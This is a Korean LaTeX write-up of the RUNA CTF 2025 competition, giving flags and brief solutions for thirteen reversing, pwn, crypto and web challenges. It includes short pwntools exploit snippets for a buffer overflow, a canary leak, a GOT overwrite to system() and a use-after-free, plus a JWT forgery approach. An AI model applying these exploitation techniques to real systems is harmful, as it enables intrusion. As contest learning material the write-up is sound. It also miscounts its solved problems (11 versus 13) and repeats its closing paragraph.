\documentclass[11pt,a4paper]{article}
\usepackage[utf8]{inputenc}
\usepackage[korean]{babel}
\usepackage{kotex}
\usepackage{amsmath}
\usepackage{amsfonts}
\usepackage{amssymb}
\usepackage{graphicx}
\usepackage{xcolor}
\usepackage{listings}
\usepackage{geometry}
\usepackage{fancyhdr}
\usepackage{enumitem}

\geometry{margin=2.5cm}
\pagestyle{fancy}
\fancyhf{}
\rhead{RUNA CTF 2025}
\lhead{Write-up}
\cfoot{\thepage}

% 코드 스타일
\lstset{
    basicstyle=\footnotesize\ttfamily,
    breaklines=true,
    frame=single,
    backgroundcolor=\color{gray!10}
}

\title{\textbf{RUNA CTF 2025 Write-up}}
\author{CTF Team}
\date{2025년 11월 29일}

\begin{document}

\maketitle

\section{개요}
이번 대회에서 총 11개 문제 해결함. pwn, rev, crypto 각각 다뤘고 나름 괜찮았음.

\section{풀이 문제들}

\subsection{1. 팔 (ARM64 Reversing)}
\textbf{Flag:} \texttt{runa2025\{Can\_you\_r3ad\_code\_data\_in\_newbie\_rev\}}

ARM64 바이너리였는데 실행하면 아무것도 안나옴. strings로 봐도 flag 안보여서 hexdump로 .data섹션 뜯어봤더니 포인터들이 .rodata 문자들 가리키고 있었음.

\begin{lstlisting}[language=bash]
readelf -x .data for_user
\end{lstlisting}

포인터 따라가니까 flag 나옴. 간단했음.

\subsection{2. yeezyBof (Basic BOF)}
\textbf{Flag:} \texttt{runa2025\{4nd\_I\_Always\_FInD\_yEAh\_I\_Alw4yS\_find\_soMeTh1nG\_wrON9\}}

기본 bof. gets() 있고 win함수 있어서 그냥 ret2win.

\begin{lstlisting}[language=python]
from pwn import *
p = remote('pwn.runa2025.kr', 7001)
payload = b'A' * 72 + p64(0x4011f6)
p.sendline(payload)
p.interactive()
\end{lstlisting}

오프셋 72바이트였음.

\subsection{3. peezyBof (Canary Leak)}
\textbf{Flag:} \texttt{runa2025\{brACE\_yourSE1F\_1ll\_taKE\_y0u\_on\_4\_7rip\_dOwn\_MEmory\_1ANe\}}

카나리 있는 bof. 카나리 LSB가 0x00이라서 null byte 덮어쓰고 puts로 leak하는거였음.

\begin{lstlisting}[language=python]
# canary LSB 덮기
payload = b'A' * 40 + b'\xff'
p.send(payload)
leaked = p.recvline()
canary = u64(b'\x00' + leaked[40:47])

# 정상 exploit
payload = b'A' * 40 + p64(canary) + b'B' * 8 + p64(win_addr)
\end{lstlisting}

\subsection{4. sasuke\_dular (GOT Overwrite)}
\textbf{Flag:} \texttt{runa2025\{jESu5\_C4NT\_Sav3\_yOu\_lIFE\_574rtS\_whEn\_7He\_cHurCh\_END\}}

이거 진짜 어려웠음. 일정관리 프로그램인데 normalize\_day\_input에서 음수 그대로 리턴하는 버그있음.

핵심은:
\begin{itemize}
\item day = -2로 설정하면 puts@GOT 읽을 수 있음
\item day = -1로 설정하면 strtol@GOT 덮을 수 있음
\item strtol을 system으로 바꾸고 다음 입력을 "cat flag.txt"로 하면 됨
\end{itemize}

\begin{lstlisting}[language=python]
# libc leak
show(p, -2)
# GOT overwrite  
register(p, -1, 8, 9, p64(system_addr))
# shell
p.sendline(b'cat flag.txt')
\end{lstlisting}

메모리 레이아웃 계산이 관건이었음.

\subsection{5. out may be in (Number Baseball)}
\textbf{Flag:} \texttt{runa2025\{number\_baseball\_r3v3rs3\_3ng1n33r1ng\_is\_fun\}}

숫자야구 문제. 바이너리 까보니까 237점 만들어야 함.
10S + 5B - 3O = 237, S+B+O = 25 조건에서
24S + 1O = 237 → S=24, B=0, O=1

답은 71395였고 4번 맞히고 1번 틀리면 됨.

\subsection{6. Just read this}
\textbf{Flag:} \texttt{runa2025\{4f7b419b18d597cbabb9e4595b1c2172caac43b72c9fa65218fb1c74e3255335\}}

7zip으로 열어보니까 그냥 flag 있었음. 뭔가 함정이 있나 했는데 진짜였음.

\subsection{7. heap-hop (UAF)}
\textbf{Flag:} \texttt{runa2025\{JusT\_come\_outS1DE\_fOr\_ThE\_nIGHT\_\}}

UAF 문제. secret\_menu(96873)로 플래그 읽어서 malloc하고 바로 free함. 근데 user\_cnt 안올라가서 다음 malloc에서 같은 청크 재사용됨.

\begin{lstlisting}[language=python]
# 첫번째 유저 추가
add_user(p, "user0")
# secret menu로 flag 읽기 + free
p.sendlineafter(b'>>', b'96873')  
# 두번째 유저 추가 (재사용)
add_user(p, "admin")
# 정보 확인하면 flag 나옴
show_users(p)
\end{lstlisting}

\subsection{8. Assem..ble?}
\textbf{Flag:} \texttt{runa2025\{a164ace93f9455bea57c6cc6b7eba246fcb438a24b645a4d698adfbc4440273907ddbb85acee0f814692a498a76a73e36692de769f3f6a7a2350e6cafdace462\}}

문자를 bit shuffle하고 XOR하고 테이블 lookup하는 알고리즘. 역산해서 각 위치별로 맞는 문자 찾으면 됨.

비트셔플:
0→5, 1→6, 2→7, 3→0, 4→1, 5→2, 6→3, 7→4

.data 섹션에 인코딩된 플래그 있어서 디코딩했더니 나옴.

\subsection{9. GET out of there!}
\textbf{Flag:} \texttt{runa2025\{Welcome\_to\_RUNA\_CTF\_enjoyyy!!!!\}}

HTTP 요청 문제. HEAD method로 쿼리 날리면 X-Flag 헤더에 플래그 줌.

\begin{lstlisting}[language=bash]
curl -I "http://web.runa2025.kr:5002/test?query=value"
\end{lstlisting}

\subsection{10. P2PE (PE 수정)}
\textbf{Flag:} \texttt{runa2025\{y0u\_und3rst4nd\_PE\_file\_structur3\}}

PE파일 헤더가 깨져있었음. DOS Magic(4D5A)랑 PE offset(F8) 고쳐주니까 실행됨.

\begin{lstlisting}[language=python]
data[0:2] = b'\x4D\x5A'  # MZ
data[0x3C:0x40] = struct.pack('<I', 0xF8)  # PE offset
\end{lstlisting}

\subsection{11. Shototsu (MD4 Collision)}
\textbf{Flag:} \texttt{runa2025\{md4\_collision\_is\_really\_danger\_crypt0system\_and\_so\_many\_pair\}}

MD4 해시 충돌. 기본 충돌 메시지에 null byte 하나씩 붙여서 제출하면 됨.

\begin{lstlisting}[language=python]
m1 = base_collision_1 + b'\x00'
m2 = base_collision_2 + b'\x00'
\end{lstlisting}

MD4 진짜 약하네.

\subsection{12. Zeckendorf}
\textbf{Flag:} \texttt{runa2025\{a357118d0694a8bfb9df30487407a3fae9f968971bc3f6accc962a13038e21c3\}}

피보나치 수로 정수 표현하는 문제. 비트스트림을 12비트씩 끊어서 각 비트가 피보나치 수 포함 여부 나타냄.

\begin{lstlisting}[language=python]
for i in range(74):
    bits = bitstream[i*12:(i+1)*12]
    value = sum(FIBONACCI[j] for j in range(12) if bits[j] == '1')
    flag += chr(value)
\end{lstlisting}

\subsection{13. Redeem Code (JWT)}
\textbf{Flag:} \texttt{runa2025\{bcrypt\_truncation\_ftw\}}

JWT 토큰 위조. ADMIN\_SECRET이 빈 문자열이어서 그냥 bcrypt로 체크 우회 가능했음.

payload.admin = true로 설정하고 빈 시크릿으로 서명하면 됨.

\section{총평}

다양한 분야 문제들이 있어서 재미있었음. 특히 sasuke\_dular랑 heap-hop이 어려웠는데 배운게 많음. ARM64 rev도 처음 해봤는데 괜찮았음.

다양한 분야 문제들이 있어서 재미있었음. 특히 sasuke\_dular랑 heap-hop이 어려웠는데 배운게 많음. ARM64 rev도 처음 해봤는데 괜찮았음.

crypto는 기본적인 것들이어서 무난했고, web도 간단했음. 전체적으로 난이도 적당했던것 같음.

총 13개 문제 풀었는데 만족스러움.

\end{document}
